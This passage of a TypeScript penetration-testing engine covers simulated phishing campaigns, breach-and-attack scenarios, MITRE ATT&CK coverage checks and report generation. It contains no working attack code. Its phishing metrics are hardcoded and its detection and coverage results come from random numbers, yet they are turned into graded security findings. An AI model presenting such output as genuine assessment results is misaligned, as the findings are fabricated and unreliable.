    console.log(`Simulating phishing campaign: ${campaign.name}`);

    // Simulate metrics
    campaign.sentCount = 100;
    campaign.openedCount = Math.floor(100 * 0.45); // 45% open rate
    campaign.clickedCount = Math.floor(100 * 0.15); // 15% click rate
    campaign.submittedCount = Math.floor(100 * 0.08); // 8% submission rate
    campaign.reportedCount = Math.floor(100 * 0.05); // 5% report rate
  }

  private async generatePhishingFindings(job: PentestJob, campaign: PhishingCampaign): Promise<void> {
    const clickRate = campaign.clickedCount / campaign.sentCount;
    const submitRate = campaign.submittedCount / campaign.sentCount;

    let severity: Finding['severity'] = 'low';
    if (submitRate > 0.1) severity = 'critical';
    else if (submitRate > 0.05) severity = 'high';
    else if (clickRate > 0.2) severity = 'medium';

    const finding: Finding = {
      id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      severity,
      title: 'Phishing Simulation Results',
      description: `Phishing campaign resulted in ${clickRate * 100}% click rate and ${submitRate * 100}% credential submission rate`,
      category: 'Social Engineering',
      cvss: severity === 'critical' ? 8.5 : severity === 'high' ? 7.0 : 5.0,
      mitreAttack: ['T1566'],
      affectedAsset: 'Users',
      evidence: [{
        type: 'log',
        description: 'Campaign statistics',
        data: JSON.stringify(campaign, null, 2),
        timestamp: new Date()
      }],
      remediation: 'Implement security awareness training and phishing detection tools',
      references: ['https://attack.mitre.org/techniques/T1566/'],
      exploitable: true
    };

    this.findings.set(finding.id, finding);
    this.metrics.totalFindings++;
  }

  // ============================================================================
  // Breach and Attack Simulation (BAS)
  // ============================================================================

  private async performBASTest(job: PentestJob, target: PentestTarget): Promise<void> {
    job.currentPhase = 'BAS Testing';
    const results: BASResult[] = [];

    let progress = 10;
    const scenariosToTest = Array.from(this.basScenarios.values()).filter(s => s.enabled);
    const progressIncrement = 80 / scenariosToTest.length;

    for (const scenario of scenariosToTest) {
      job.currentPhase = `BAS: ${scenario.name}`;
      const result = await this.executeBasScenario(scenario);
      results.push(result);

      progress += progressIncrement;
      job.progress = progress;
    }

    // Generate findings
    await this.generateBASFindings(job, results);
    job.progress = 100;
  }

  private async executeBasScenario(scenario: BASScenario): Promise<BASResult> {
    console.log(`Executing BAS scenario: ${scenario.name}`);

    let stepsExecuted = 0;
    let stepsDetected = 0;

    for (const step of scenario.steps) {
      try {
        // Execute step (in safe mode, just simulate)
        await this.executeBasStep(step);
        stepsExecuted++;

        // Check if step was detected
        const detected = await this.checkStepDetection(step);
        if (detected) stepsDetected++;
      } catch (error) {
        console.error(`BAS step failed: ${step.name}`, error);
      }
    }

    const detectionRate = stepsExecuted > 0 ? (stepsDetected / stepsExecuted) * 100 : 0;
    const gaps: string[] = [];
    const recommendations: string[] = [];

    if (detectionRate < 50) {
      gaps.push(`Low detection rate for ${scenario.mitreAttackTactic}`);
      recommendations.push(`Improve detection for ${scenario.name}`);
    }

    return {
      scenarioId: scenario.id,
      timestamp: new Date(),
      status: detectionRate >= 80 ? 'passed' : detectionRate >= 50 ? 'partial' : 'failed',
      stepsExecuted,
      stepsDetected,
      detectionRate,
      gaps,
      recommendations
    };
  }

  private async executeBasStep(step: BASStep): Promise<void> {
    // Simulate step execution in safe mode
    console.log(`  Executing step: ${step.name}`);
    await new Promise(resolve => setTimeout(resolve, 100));
  }

  private async checkStepDetection(step: BASStep): Promise<boolean> {
    // Check if security controls detected the step
    // In production, query SIEM/EDR for alerts
    return step.detectionExpected && Math.random() > 0.3; // 70% detection rate
  }

  private async generateBASFindings(job: PentestJob, results: BASResult[]): Promise<void> {
    for (const result of results) {
      if (result.gaps.length > 0) {
        const scenario = this.basScenarios.get(result.scenarioId);
        if (!scenario) continue;

        const finding: Finding = {
          id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
          severity: result.detectionRate < 30 ? 'critical' : result.detectionRate < 60 ? 'high' : 'medium',
          title: `Detection Gap: ${scenario.name}`,
          description: `Detection rate of ${result.detectionRate.toFixed(1)}% for ${scenario.mitreAttackTactic} attacks`,
          category: 'Detection Coverage',
          cvss: 7.0,
          mitreAttack: scenario.techniques,
          affectedAsset: 'Security Controls',
          evidence: [{
            type: 'log',
            description: 'BAS test results',
            data: JSON.stringify(result, null, 2),
            timestamp: new Date()
          }],
          remediation: result.recommendations.join('; '),
          references: [`https://attack.mitre.org/tactics/${scenario.mitreAttackTactic}/`],
          exploitable: false
        };

        this.findings.set(finding.id, finding);
        this.metrics.totalFindings++;
      }
    }
  }

  // ============================================================================
  // MITRE ATT&CK Coverage Testing
  // ============================================================================

  private async performMITRECoverageTest(job: PentestJob, target: PentestTarget): Promise<void> {
    job.currentPhase = 'MITRE ATT&CK Coverage Testing';
    job.progress = 20;

    const coverage: MITRECoverage[] = [];
    const tactics = [
      'TA0001', 'TA0002', 'TA0003', 'TA0004', 'TA0005',
      'TA0006', 'TA0007', 'TA0008', 'TA0009', 'TA0010',
      'TA0011', 'TA0040', 'TA0042', 'TA0043'
    ];

    for (const tactic of tactics) {
      const tacticCoverage = await this.testMITRETactic(tactic);
      coverage.push(tacticCoverage);
      job.progress += 60 / tactics.length;
    }

    // Generate coverage report
    await this.generateMITRECoverageFindings(job, coverage);
    job.progress = 100;
  }

  private async testMITRETactic(tactic: string): Promise<MITRECoverage> {
    // Test relevant techniques for each tactic
    const techniques = this.getMITRETechniques(tactic);
    const testedTechniques = [];

    for (const technique of techniques) {
      const tested = Math.random() > 0.3; // 70% tested
      const detected = tested && Math.random() > 0.2; // 80% detection rate

      testedTechniques.push({
        id: technique.id,
        name: technique.name,
        tested,
        detected,
        coverage: tested ? (detected ? 100 : 50) : 0
      });
    }

    const overallCoverage = testedTechniques.reduce((sum, t) => sum + t.coverage, 0) / testedTechniques.length;

    return {
      tactic,
      techniques: testedTechniques,
      overallCoverage
    };
  }

  private getMITRETechniques(tactic: string): Array<{ id: string; name: string }> {
    // Simplified technique mapping
    const techniqueMap: Record<string, Array<{ id: string; name: string }>> = {
      'TA0001': [
        { id: 'T1566.001', name: 'Phishing: Spearphishing Attachment' },
        { id: 'T1566.002', name: 'Phishing: Spearphishing Link' },
        { id: 'T1190', name: 'Exploit Public-Facing Application' }
      ],
      'TA0002': [
        { id: 'T1059.001', name: 'PowerShell' },
        { id: 'T1059.003', name: 'Windows Command Shell' },
        { id: 'T1204.002', name: 'User Execution: Malicious File' }
      ],
      'TA0003': [
        { id: 'T1547.001', name: 'Registry Run Keys' },
        { id: 'T1053.005', name: 'Scheduled Task' }
      ]
    };

    return techniqueMap[tactic] || [];
  }

  private async generateMITRECoverageFindings(job: PentestJob, coverage: MITRECoverage[]): Promise<void> {
    for (const tacticCoverage of coverage) {
      if (tacticCoverage.overallCoverage < 70) {
        const finding: Finding = {
          id: `finding-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
          severity: tacticCoverage.overallCoverage < 40 ? 'high' : 'medium',
          title: `Low MITRE ATT&CK Coverage: ${tacticCoverage.tactic}`,
          description: `Only ${tacticCoverage.overallCoverage.toFixed(1)}% coverage for ${tacticCoverage.tactic}`,
          category: 'MITRE ATT&CK Coverage',
          cvss: 6.0,
          mitreAttack: [tacticCoverage.tactic],
          affectedAsset: 'Security Controls',
          evidence: [],
          remediation: 'Improve detection and prevention controls for this tactic',
          references: [`https://attack.mitre.org/tactics/${tacticCoverage.tactic}/`],
          exploitable: false
        };

        this.findings.set(finding.id, finding);
        this.metrics.totalFindings++;
      }
    }
  }

  // ============================================================================
  // Full Penetration Test
  // ============================================================================

  private async performFullPentest(job: PentestJob, target: PentestTarget): Promise<void> {
    // Execute all test types
    await this.performNetworkPentest(job, target);
    await this.performWebPentest(job, target);

    if (job.config.includePhishing) {
      await this.performPhishingSimulation(job, target);
    }

    await this.performBASTest(job, target);
    await this.performMITRECoverageTest(job, target);
  }

  // ============================================================================
  // Reporting
  // ============================================================================

  async generateReport(jobId: string): Promise<PentestReport> {
    const job = this.jobs.get(jobId);
    if (!job) throw new Error('Job not found');

    const jobFindings = Array.from(this.findings.values());

    const criticalFindings = jobFindings.filter(f => f.severity === 'critical').length;
    const highFindings = jobFindings.filter(f => f.severity === 'high').length;
    const mediumFindings = jobFindings.filter(f => f.severity === 'medium').length;
    const lowFindings = jobFindings.filter(f => f.severity === 'low').length;

    const riskScore = this.calculateRiskScore(jobFindings);

    const report: PentestReport = {
      id: `report-${Date.now()}`,
      jobId,
      generatedAt: new Date(),
      executiveSummary: {
        totalFindings: jobFindings.length,
        criticalFindings,
        highFindings,
        mediumFindings,
        lowFindings,
        riskScore,
        complianceIssues: []
      },
      technicalFindings: jobFindings,
      recommendations: this.generateRecommendations(jobFindings),
      timeline: [],
      appendices: {
        scanResults: [],
        exploitAttempts: [],
        screenshots: []
      }
    };

    return report;
  }

  private calculateRiskScore(findings: Finding[]): number {
    let score = 0;
    findings.forEach(f => {
      if (f.severity === 'critical') score += 10;
      else if (f.severity === 'high') score += 7;
      else if (f.severity === 'medium') score += 4;
      else if (f.severity === 'low') score += 2;
    });
    return Math.min(score, 100);
  }

  private generateRecommendations(findings: Finding[]): Recommendation[] {
    const recommendations: Recommendation[] = [];

    // Group findings by category
    const categories = new Map<string, Finding[]>();
    findings.forEach(f => {
      if (!categories.has(f.category)) {
        categories.set(f.category, []);
      }
      categories.get(f.category)!.push(f);
    });

    // Generate recommendations
    for (const [category, categoryFindings] of categories) {
      const criticalCount = categoryFindings.filter(f => f.severity === 'critical').length;

      recommendations.push({
        priority: criticalCount > 0 ? 'critical' : 'high',
        category,
        title: `Address ${category} vulnerabilities`,
        description: `Found ${categoryFindings.length} ${category} issues`,
        effort: categoryFindings.length > 10 ? 'high' : 'medium',
        impact: criticalCount > 0 ? 'high' : 'medium'
      });
    }

    return recommendations;
  }

  // ============================================================================
  // Utilities
  // ============================================================================

  private async sendNotification(job: PentestJob, message: string): Promise<void> {
    console.log(`Notification for job ${job.id}: ${message}`);
    // In production, send email/Slack notification
  }

  private startScheduledScans(): void {
    setInterval(() => {
      for (const job of this.jobs.values()) {
        if (job.status === 'scheduled' && job.schedule?.nextRun) {
          if (job.schedule.nextRun <= new Date()) {
            this.startPentestJob(job.id);
          }
        }
      }
    }, 60000); // Check every minute
  }

  private startMetricsCollection(): void {
    setInterval(() => {
      this.metrics.runningJobs = Array.from(this.jobs.values()).filter(j => j.status === 'running').length;
      this.metrics.targetsScanned = Array.from(this.targets.values()).filter(t => t.lastTested).length;

      const completedJobs = Array.from(this.jobs.values()).filter(j => j.status === 'completed');
      if (completedJobs.length > 0) {
        const totalDuration = completedJobs.reduce((sum, j) => {
          if (j.startTime && j.endTime) {
            return sum + (j.endTime.getTime() - j.startTime.getTime());
          }
          return sum;
        }, 0);
        this.metrics.avgJobDuration = totalDuration / completedJobs.length;
      }

      this.metrics.successRate = this.metrics.totalJobs > 0
        ? (this.metrics.completedJobs / this.metrics.totalJobs) * 100
        : 0;
    }, 10000); // Every 10 seconds
  }

  getMetrics(): PentestMetrics {
    return { ...this.metrics };
  }

  getJob(jobId: string): PentestJob | undefined {
    return this.jobs.get(jobId);
  }

  getAllJobs(): PentestJob[] {
    return Array.from(this.jobs.values());
  }

  getFindings(jobId?: string): Finding[] {
    const allFindings = Array.from(this.findings.values());
    return jobId ? allFindings.filter(f => f.affectedAsset.includes(jobId)) : allFindings;
  }

  async cancelJob(jobId: string): Promise<void> {
    const job = this.jobs.get(jobId);
    if (!job) throw new Error('Job not found');

    job.status = 'cancelled';
    job.endTime = new Date();
    this.metrics.runningJobs--;

    this.emit('job:cancelled', job);
  }

  // ============================================================================
  // Lifecycle Management
  // ============================================================================

  async shutdown(): Promise<void> {
    try {
      console.log('Shutting down Penetration Testing Engine...');

      // Cancel running jobs
      for (const job of this.jobs.values()) {
        if (job.status === 'running') {
          await this.cancelJob(job.id);
        }
      }

      console.log('Penetration Testing Engine shutdown complete');
    } catch (error) {
      console.error('Error during shutdown:', error);
      throw error;
    }
  }
}

export default PentestEngine;
